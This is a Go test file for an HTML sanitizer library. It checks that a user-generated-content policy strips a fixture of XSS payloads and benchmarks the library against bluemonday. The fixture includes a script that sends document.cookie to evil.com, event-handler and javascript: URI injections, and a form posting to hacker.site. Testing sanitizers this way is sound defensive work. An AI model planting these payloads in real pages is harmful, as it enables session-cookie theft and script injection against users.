package policies_test

import (
	"bufio"
	"io"
	"strings"
	"testing"

	_ "embed"

	"github.com/empijei/go-html-sanitizer/policies"
	"github.com/empijei/go-html-sanitizer/sanitize"
	"github.com/empijei/tst"
	"github.com/microcosm-cc/bluemonday"
)

var inMisc = `<div id="main-content" onclick="stealSessionCookies()">
  <b>This is safe bold text</b><br>
  
  <script type="text/javascript">
    fetch('http://evil.com/log?c=' + document.cookie);
  </script>

  <img src="https://example.com/valid-image.jpg" onload="alert('XSS 1')" alt="A standard 10 cm x 10 cm image">

  <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' 
          viewBox='0 0 96 96'><rect id='USED' width='50%' height='50%' 
          stroke='red'/><use href='%23USED' x='24' y='24'/></svg>"/>

  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA
          AAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO
          9TXL0Y4OHwAAAABJRU5ErkJggg==" alt="Red dot">
  
  <img src="javascript:alert('XSS 2')" alt="Malicious source">

  <table border="1" background="javascript:alert('XSS 3')" onmouseover="crashBrowser()">
    <tr>
      <td>Standard cell</td>
      <td>
        <iframe src="http://malware.site/hidden"></iframe>
        Hidden iframe text
      </td>
    </tr>
  </table>

  <ul style="list-style-type: square; background-image: url('javascript:alert(4)')">
    <li>Item one with a <a href="javascript:void(0)" onfocus="alert('XSS 5')">Bad Link</a></li>
    <li>Item two with an <object data="malware.swf"></object></li>
  </ul>

  <form action="http://hacker.site" method="POST">
    Please enter your data: <input type="text" name="secret_data" value="hidden payload">
  </form>

  <custom-element funky-attr="executeBadStuff()">
    Text inside an unknown, unallowed tag.
  </custom-element>
</div>`

func TestUGC(t *testing.T) {
	tst.Go(t)
	ugcp := policies.UserGeneratedContent()
	got := ugcp.SanitizeString(inMisc)
	want := `<div id="main-content">
<b>This is safe bold text</b><br/>
<img src="https://example.com/valid-image.jpg" alt="A standard 10 cm x 10 cm image" crossorigin="anonymous"/>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA
AAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO
9TXL0Y4OHwAAAABJRU5ErkJggg==" alt="Red dot" crossorigin="anonymous"/>
<table>
<tbody><tr>
<td>Standard cell</td>
<td>
Hidden iframe text
</td>
</tr>
</tbody></table>
<ul>
<li>Item one with a Bad Link</li>
<li>Item two with an </li>
</ul>
Please enter your data: 
Text inside an unknown, unallowed tag.
</div>
`
	tst.Is(want, stripWhitespace(got), t)
}

func BenchmarkUGC_Sanitize(b *testing.B) {
	ugcp := policies.UserGeneratedContent()
	in := strings.NewReader(inMisc)
	b.ResetTimer()
	for b.Loop() {
		got := ugcp.Sanitize(io.Discard, in)
		_ = got
		in.Reset(inMisc)
	}
}

//go:embed testdata/html.spec.whatwg.org_index.html
var massiveHTML string

func BenchmarkWithLargeHTML(b *testing.B) {
	ugcp := policies.UserGeneratedContent()
	in := strings.NewReader(massiveHTML)
	b.SetBytes(1 * 1024 * 1024)
	b.ReportAllocs()
	b.ResetTimer()
	for b.Loop() {
		got := ugcp.Sanitize(io.Discard, in)
		_ = got
		in.Reset(massiveHTML)
	}
	b.StopTimer()
	msPerOp := float64(b.Elapsed().Milliseconds()) / float64(b.N)
	b.ReportMetric(msPerOp, "ms/op")
}

func BenchmarkBMWithLargeHTML(b *testing.B) {
	ugcp := bluemonday.UGCPolicy()
	in := strings.NewReader(massiveHTML)
	b.SetBytes(1 * 1024 * 1024)
	b.ReportAllocs()
	b.ResetTimer()
	for b.Loop() {
		got := ugcp.SanitizeReaderToWriter(in, io.Discard)
		_ = got
		in.Reset(massiveHTML)
	}
	b.StopTimer()
	msPerOp := float64(b.Elapsed().Milliseconds()) / float64(b.N)
	b.ReportMetric(msPerOp, "ms/op")
}

func stripWhitespace(input string) string {
	var result strings.Builder
	scanner := bufio.NewScanner(strings.NewReader(input))
	for scanner.Scan() {
		line := strings.TrimLeft(scanner.Text(), " \n\t\v\f\r")
		if line == "" {
			continue
		}
		result.WriteString(line)
		result.WriteRune('\n')
	}

	return result.String()
}

func TestAttributeModifiers(t *testing.T) {
	tst.Go(t)
	p := &sanitize.Policy{
		Allow: map[sanitize.TagName]map[sanitize.AttributeName]sanitize.AttributeFilter{
			"iframe": {"src": nil, "sandbox": nil},
			"a":      {"href": nil, "rel": nil, "target": nil},
		},
		URIs: policies.NewURIs(),
	}

	policies.AddIFrameSandbox(p, policies.SandboxAllowForms)
	policies.AddAttributeRel(p)
	policies.AddAttributeTarget(p)

	in := `<a href="https://trusted.dev/1" rel="custom noopener noreferrer">text</a>
<a href="https://trusted.dev/2" target="bad">text</a>
<iframe src="https://alsotrusted.org/3" sandbox="allow-downloads"></iframe>
<iframe src="https://alsotrusted.org/4"></iframe>
<iframe src="https://alsotrusted.org/5" sandbox="allow-forms"></iframe>
`
	got := p.SanitizeString(in)
	want := `<a href="https://trusted.dev/1" rel="custom noopener noreferrer nofollow ugc" target="_blank">text</a>
<a href="https://trusted.dev/2" target="_blank" rel="nofollow noreferrer ugc">text</a>
<iframe src="https://alsotrusted.org/3" sandbox="allow-forms"></iframe>
<iframe src="https://alsotrusted.org/4" sandbox="allow-forms"></iframe>
<iframe src="https://alsotrusted.org/5" sandbox="allow-forms"></iframe>
`
	tst.Is(want, stripWhitespace(got), t)
}
